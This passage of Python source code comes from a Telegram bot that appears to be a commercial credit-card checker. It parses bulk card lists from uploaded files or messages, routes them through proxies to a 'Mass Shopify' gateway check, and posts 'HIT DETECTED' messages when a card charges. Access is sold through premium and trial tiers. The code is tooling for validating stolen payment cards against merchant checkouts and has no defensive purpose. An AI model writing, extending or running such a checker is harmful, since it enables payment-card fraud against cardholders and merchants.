                    parse_mode="HTML",
                    reply_markup=get_control_buttons(session_id, is_active=False),
                    link_preview_options=LinkPreviewOptions(is_disabled=True)
                )
            else:
                await progress.edit_text(
                    format_progress(stats, session_id, is_stopped=False, is_done=True),
                    parse_mode="HTML",
                    reply_markup=get_control_buttons(session_id, is_active=False),
                    link_preview_options=LinkPreviewOptions(is_disabled=True)
                )
        except Exception as e:
            if "Message is not modified" not in str(e):
                logger.error(f"Final progress update error: {e}")
        async def cleanup_session():
            await asyncio.sleep(SESSION_EXPIRY_SECONDS)
            if session_id in active_mass_checks:
                active_mass_checks.pop(session_id, None)
                logger.info(f"Session {session_id} cleaned up")
        asyncio.create_task(cleanup_session())





def format_hit_message(result: dict, user_id: int, username: str, first_name: str) -> tuple:
    status_info = result.get("status_info", {"status": "Unknown", "emoji": E.ERROR})
    status = status_info.get("status", "Unknown")
    emoji = status_info.get("emoji", E.ERROR)
    response = result.get("response", "No response")[:100]
    gateway = result.get("gateway", "Shopify")
    price = result.get('price', '0')
    currency = result.get('currency', 'USD')
    try:
        price_float = float(re.sub(r'[^\d.]', '', price))
        price_display = f"${price_float:.2f} {currency}"
    except:
        price_display = f"${price} {currency}"
    display_name = f"<a href='tg://user?id={user_id}'>{first_name}</a>"
    tier = "Premium" if is_premium(user_id) else "Trial"
    text = f"""
🔥 <b>HIT DETECTED</b>
━━━━━━━━━━━━━━━━━━
<b>{E.GATE} Gateway:</b> {gateway}
<b>💲 Price:</b> {price_display}
<b>{E.get_charge_emoji()} Status:</b> {status} {emoji}
<b>{E.RESPONSE} Response:</b> <code>{response}</code>
━━━━━━━━━━━━━━━━━━
<b>{E.USER} User:</b> {display_name} [{tier}]"""
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("MA̸𝑹K", url="https://t.me/OggyPrimeBot", style="primary", icon_custom_emoji_id=BE.HIIT)]
    ])
    return text, keyboard





@check_lock
@rate_limit("mass")
async def handle_msh_command(update: Update, context: CallbackContext):
    user = update.effective_user
    user_id = user.id
    if not is_premium(user_id):
        await update.message.reply_text(f"""
{E.WARNING} PREMIUM REQUIRED
━━━━━━━━━━━━━━━━━━
{E.NOTE} Mass Shopify is only available for premium users.
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""", parse_mode="HTML")
        return
    for sid, data in active_mass_checks.items():
        if data.get("user_id") == user_id and not data.get("completed", False):
            await update.message.reply_text(f"""
{E.WARNING} ACTIVE SESSION EXISTS
━━━━━━━━━━━━━━━━━━
{E.NOTE} You already have an active mass check.
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""", parse_mode="HTML")
            return
    if not is_gate_enabled('shopify_mass'):
        await update.message.reply_text(f"""
{E.CLOSE} GATE UNAVAILABLE
━━━━━━━━━━━━━━━━━━
{E.NOTE} The <b>Mass Shopify</b> gate is currently disabled.
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""", parse_mode="HTML")
        return

    raw_text = ""
    if update.message.reply_to_message:
        reply = update.message.reply_to_message
        if reply.document:
            try:
                file = await context.bot.get_file(reply.document.file_id)
                file_content = await file.download_as_bytearray()
                raw_text = file_content.decode('utf-8', errors='ignore')
            except Exception as e:
                await update.message.reply_text(f"""
{E.ERROR} FAILED TO READ FILE
━━━━━━━━━━━━━━━━━━
{E.NOTE} {str(e)}
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""", parse_mode="HTML")
                return
        elif reply.text:
            raw_text = reply.text
        elif reply.caption:
            raw_text = reply.caption
    elif update.message.document:
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            file_content = await file.download_as_bytearray()
            raw_text = file_content.decode('utf-8', errors='ignore')
        except Exception as e:
            await update.message.reply_text(f"""
{E.ERROR} FAILED TO READ FILE
━━━━━━━━━━━━━━━━━━
{E.NOTE} {str(e)}
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""", parse_mode="HTML")
            return
    elif context.args:
        raw_text = " ".join(context.args)

    if not raw_text:
        await update.message.reply_text(f"""
{E.WARNING} NO CARDS FOUND
━━━━━━━━━━━━━━━━━━
{E.NOTE} Send a .txt file or reply to a message with cards.
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""", parse_mode="HTML")
        return

    all_cards = extract_cards_from_text(raw_text)
    if not all_cards:
        await update.message.reply_text(f"""
{E.WARNING} NO VALID CARDS FOUND
━━━━━━━━━━━━━━━━━━
{E.NOTE} Could not extract any valid cards from the input.
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""", parse_mode="HTML")
        return

    total = len(all_cards)
    if total > MAX_CARDS_LIMIT:
        cards_to_process = all_cards[:MAX_CARDS_LIMIT]
        excess_cards = all_cards[MAX_CARDS_LIMIT:]
        excess_count = len(excess_cards)

        excess_file = io.BytesIO("\n".join(excess_cards).encode('utf-8'))
        excess_file.name = f"excess_cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        caption = f"""
{E.WARNING} <b>Card Limit Reached</b>

{E.CARD} <b>Total:</b> {total} cards
{E.SUCCESS} <b>Processing:</b> {len(cards_to_process)} cards
{E.FILE} <b>Excess:</b> {excess_count} cards (attached)

{E.INFO} Split excess into smaller files or run later.
"""
        await update.message.reply_document(
            document=excess_file,
            caption=caption,
            parse_mode="HTML"
        )
        excess_file.close()
        cards = cards_to_process
    else:
        cards = all_cards

    proxies = get_user_proxies(user_id)
    if not proxies:
        await update.message.reply_text(f"""
{E.WARNING} NO PROXIES FOUND
━━━━━━━━━━━━━━━━━━
{E.NOTE} Add proxies using /proxy
━━━━━━━━━━━━━━━━━━
<a href='https://t.me/oggyproo'>⌬</a> <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""", parse_mode="HTML")
        return

    class FakeUpdate:
        def __init__(self, user, chat, message):
            self.effective_user = user
            self.effective_chat = chat
            self.message = message
            self.effective_message = message

    fake_update = FakeUpdate(user, update.message.chat, update.message)
    asyncio.create_task(process_mass_check(
        cards=cards,
        user_id=user_id,
        include_approved=False,
        update=fake_update,
        context=context
    ))